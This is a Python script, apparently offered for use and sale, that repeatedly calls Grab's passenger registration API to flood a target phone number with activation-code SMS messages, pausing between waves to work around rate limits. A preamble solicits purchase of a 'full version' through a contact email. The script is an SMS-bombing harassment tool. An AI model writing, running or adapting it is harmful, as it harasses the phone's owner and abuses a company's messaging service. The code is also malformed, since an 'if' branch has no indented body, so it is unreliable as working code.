import os
import sys
import time

import click
import requests
try:
    os.system('clear')    
except:
    os.system('cls')

__author__ = str("skifi")
print("author -",__author__)

Gmail = str("alexovbot@gmail.com")
full = str(input("Do you want to purchase the full version of the program? \n write Yes or No - "))
if full == "Yes":
    os.system('clear')
    print("write on this mail:",Gmail)
    os.system('exit')
if full == "No":


DEFAULT_REQ_DELAY = 60
GAC_REQ_URL = 'https://p.grabtaxi.com/api/passenger/v2/profiles/register'


@click.command()
@click.argument('phone_num', type=int)
@click.option('--delay',
              '-dl',
              default=DEFAULT_REQ_DELAY,
              help='delay between each request wave',
              type=int)
@click.option('--limit', '-li', help='amount of request to send', type=int)
@click.option('--country_code',
              '-cc',
              help='phone number country code',
              default='ID')
def main(phone_num, delay, limit, country_code):
    """
    This script will repeatedly send Grab Activation Code (GAC) to PHONE_NUM.
    PHONE_NUM must be a phone number in international format
    (example: 6281323323232 with 62 prefix as the country code)
    """
    i = 0
    click.secho(f'-- phone number: {phone_num}, country code: {country_code}',
                fg='cyan')
    while i == 0 or i < limit:
        res, reason, wait = send_gac_req(phone_num, country_code)
        long_res = 'success' if res else 'failed'
        click.secho(f'i = {i} ~> {long_res}: {reason}, sleep: {wait}',
                    fg='blue' if res else 'red')
        if wait and (i == 0 or i < limit):
            time.sleep(delay)
        i += 1
    return


def send_gac_req(phone_num, cc):
    req_kwargs = {
        'data': {
            'phoneNumber': phone_num,
            'countryCode': cc,
            'name': 'test',
            'email': 'mail@mail.com',
            'deviceToken': '*'
        },
        'headers': {
            'User-Agent':
            ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ('
             '+KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36')
        }
    }
    try:
        req = requests.post(GAC_REQ_URL, **req_kwargs)
    except requests.exceptions.RequestException:
        return False, 'exception', True
    if req.status_code == 429:
        return False, 'reached limit', True
    elif req.status_code == 200:
        return True, '200 ok', True
    else:
        raise NotImplementedError(
            'something went wrong, please submit an issue.')


if __name__ == '__main__':
    click.secho(f'{sys.argv[0]} \u2014 Grab Activation Code (GAC) spammer',
                fg='black',
                bg='green')
    click.echo(' skifi')
    click.echo(' skifi')
    main()
